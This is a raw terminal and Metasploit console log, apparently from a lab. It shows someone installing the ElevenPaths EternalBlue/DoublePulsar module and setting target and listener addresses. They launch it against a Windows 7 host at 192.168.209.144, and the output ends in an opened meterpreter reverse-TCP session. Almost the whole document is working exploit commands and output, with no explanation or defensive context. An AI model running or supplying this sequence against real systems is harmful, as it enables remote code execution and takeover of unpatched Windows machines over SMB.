root@noondi:~# git clone https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit.git
Cloning into 'Eternalblue-Doublepulsar-Metasploit'...
remote: Counting objects: 61, done.
remote: Compressing objects: 100% (51/51), done.
remote: Total 61 (delta 12), reused 58 (delta 9), pack-reused 0
Unpacking objects: 100% (61/61), done.
Checking connectivity... done.


root@noondi:/# cd root
root@noondi:~# ls
60pdb              core                                 Java.class      nFaNmjsD_227.jpeg                sublime_text_3_build_3059_x32.tar.bz2
access_log.txt.gz  Desktop                              javaD.html      onetwopunch-master               Templates
after              Documents                            Java.jar        password_cracking_filtered.pcap  tor-browser_en-US
Alice.jpeg         Downloads                            Java.java       Pictures                         useradd.c
alpha.py           Eternalblue-Doublepulsar-Metasploit  lab-connection  Public                           useradd.exe
alpha-root.py      Image-ExifTool-10.40                 manifest.txt    SignedJava.jar                   Videos
alpha-shell.pl     Image-ExifTool-10.40.tar.gz          Music           slmail-fuzz                      wuzz
before             javaAppletAttack                     mykeystore      START
root@noondi:~# cd Eternalblue-Doublepulsar-Metasploit/
root@noondi:~/Eternalblue-Doublepulsar-Metasploit# ls
deps  eternalblue_doublepulsar.rb  LICENSE  README.md
root@noondi:~/Eternalblue-Doublepulsar-Metasploit# cp eternalblue_doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb
root@noondi:~/Eternalblue-Doublepulsar-Metasploit# cd /usr/share/metasploit-framework/modules/exploits/windows/smb
root@noondi:/usr/share/metasploit-framework/modules/exploits/windows/smb# ls
eternalblue_doublepulsar.rb   ms04_031_netdde.rb       ms06_070_wkssvc.rb                     netidentity_xtierrpcpipe.rb
generic_smb_dll_injection.rb  ms05_039_pnp.rb          ms07_029_msdns_zonename.rb             psexec_psh.rb
group_policy_startup.rb       ms06_025_rasmans_reg.rb  ms08_067_netapi.rb                     psexec.rb
ipass_pipe_exec.rb            ms06_025_rras.rb         ms09_050_smb2_negotiate_func_index.rb  smb_delivery.rb
ms03_049_netapi.rb            ms06_040_netapi.rb       ms10_046_shortcut_icon_dllloader.rb    smb_relay.rb
ms04_007_killbill.rb          ms06_066_nwapi.rb        ms10_061_spoolss.rb                    timbuktu_plughntcommand_bof.rb
ms04_011_lsass.rb             ms06_066_nwwks.rb        ms15_020_shortcut_icon_dllloader.rb
root@noondi:/usr/share/metasploit-framework/modules/exploits/windows/smb# 




msf exploit(eternalblue_doublepulsar) > use exploit/windows/smb/eternalblue_doublepulsar
msf exploit(eternalblue_doublepulsar) > options

Module options (exploit/windows/smb/eternalblue_doublepulsar):

   Name                Current Setting                                  Required  Description
   ----                ---------------                                  --------  -----------
   DOUBLEPULSARPATH    /root/Eternalblue-Doublepulsar-Metasploit/deps/  yes       Path directory of Doublepulsar
   ETERNALBLUEPATH     /root/Eternalblue-Doublepulsar-Metasploit/deps/  yes       Path directory of Eternalblue
   PROCESSINJECT       wlms.exe                                         yes       Name of process to inject into (Change to lsass.exe for x64)
   RHOST               192.168.209.144                                  yes       The target address
   RPORT               445                                              yes       The SMB service port
   TARGETARCHITECTURE  x86                                              yes       Target Architecture (Accepted: x86, x64)
   WINEPATH            /root/.wine/drive_c/                             yes       WINE drive_c path


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.209.179  yes       The listen address
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   8   Windows 7 (all services pack) (x86) (x64)


msf exploit(eternalblue_doublepulsar) > set PROCESSINJECT
set PROCESSINJECT  
msf exploit(eternalblue_doublepulsar) > set PROCESSINJECT
set PROCESSINJECT  
msf exploit(eternalblue_doublepulsar) > set ETERNALBLUEPATH /root/Eternalblue-Doublepulsar-Metasploit/deps/
ETERNALBLUEPATH => /root/Eternalblue-Doublepulsar-Metasploit/deps/
msf exploit(eternalblue_doublepulsar) > set DOUBLEPULSARPATH /root/Eternalblue-Doublepulsar-Metasploit/deps/
DOUBLEPULSARPATH => /root/Eternalblue-Doublepulsar-Metasploit/deps/
msf exploit(eternalblue_doublepulsar) > set PROCESSINJECT explorer.exe
PROCESSINJECT => explorer.exe
msf exploit(eternalblue_doublepulsar) > set RHOST 192.168.209.144
RHOST => 192.168.209.144
msf exploit(eternalblue_doublepulsar) > set TARGETARCHITECTURE x86
TARGETARCHITECTURE => x86
msf exploit(eternalblue_doublepulsar) > options

Module options (exploit/windows/smb/eternalblue_doublepulsar):

   Name                Current Setting                                  Required  Description
   ----                ---------------                                  --------  -----------
   DOUBLEPULSARPATH    /root/Eternalblue-Doublepulsar-Metasploit/deps/  yes       Path directory of Doublepulsar
   ETERNALBLUEPATH     /root/Eternalblue-Doublepulsar-Metasploit/deps/  yes       Path directory of Eternalblue
   PROCESSINJECT       explorer.exe                                     yes       Name of process to inject into (Change to lsass.exe for x64)
   RHOST               192.168.209.144                                  yes       The target address
   RPORT               445                                              yes       The SMB service port
   TARGETARCHITECTURE  x86                                              yes       Target Architecture (Accepted: x86, x64)
   WINEPATH            /root/.wine/drive_c/                             yes       WINE drive_c path


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.209.179  yes       The listen address
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   8   Windows 7 (all services pack) (x86) (x64)


msf exploit(eternalblue_doublepulsar) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Windows XP (all services pack) (x86) (x64)
   1   Windows Server 2003 SP0 (x86)
   2   Windows Server 2003 SP1/SP2 (x86)
   3   Windows Server 2003 (x64)
   4   Windows Vista (x86)
   5   Windows Vista (x64)
   6   Windows Server 2008 (x86) 
   7   Windows Server 2008 R2 (x86) (x64)
   8   Windows 7 (all services pack) (x86) (x64)


msf exploit(eternalblue_doublepulsar) > set target 8
target => 8
msf exploit(eternalblue_doublepulsar) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf exploit(eternalblue_doublepulsar) > set LHOST 192.168.209.129
LHOST => 192.168.209.129
msf exploit(eternalblue_doublepulsar) > show options

Module options (exploit/windows/smb/eternalblue_doublepulsar):

   Name                Current Setting                                  Required  Description
   ----                ---------------                                  --------  -----------
   DOUBLEPULSARPATH    /root/Eternalblue-Doublepulsar-Metasploit/deps/  yes       Path directory of Doublepulsar
   ETERNALBLUEPATH     /root/Eternalblue-Doublepulsar-Metasploit/deps/  yes       Path directory of Eternalblue
   PROCESSINJECT       explorer.exe                                     yes       Name of process to inject into (Change to lsass.exe for x64)
   RHOST               192.168.209.144                                  yes       The target address
   RPORT               445                                              yes       The SMB service port
   TARGETARCHITECTURE  x86                                              yes       Target Architecture (Accepted: x86, x64)
   WINEPATH            /root/.wine/drive_c/                             yes       WINE drive_c path


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.209.129  yes       The listen address
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   8   Windows 7 (all services pack) (x86) (x64)


msf exploit(eternalblue_doublepulsar) > exploit

[*] Started reverse TCP handler on 192.168.209.129:4444 
[*] 192.168.209.144:445 - Generating Eternalblue XML data
[*] 192.168.209.144:445 - Generating Doublepulsar XML data
[*] 192.168.209.144:445 - Generating payload DLL for Doublepulsar
[*] 192.168.209.144:445 - Writing DLL in /root/.wine/drive_c/eternal11.dll
[*] 192.168.209.144:445 - Launching Eternalblue...
[+] 192.168.209.144:445 - Backdoor is already installed
[*] 192.168.209.144:445 - Launching Doublepulsar...
[*] Sending stage (957999 bytes) to 192.168.209.144
[*] Meterpreter session 1 opened (192.168.209.129:4444 -> 192.168.209.144:55224) at 2017-05-14 17:48:28 -0600
[+] 192.168.209.144:445 - Remote code executed... 3... 2... 1...

meterpreter > getuid
Server username: client\offsec
meterpreter > 
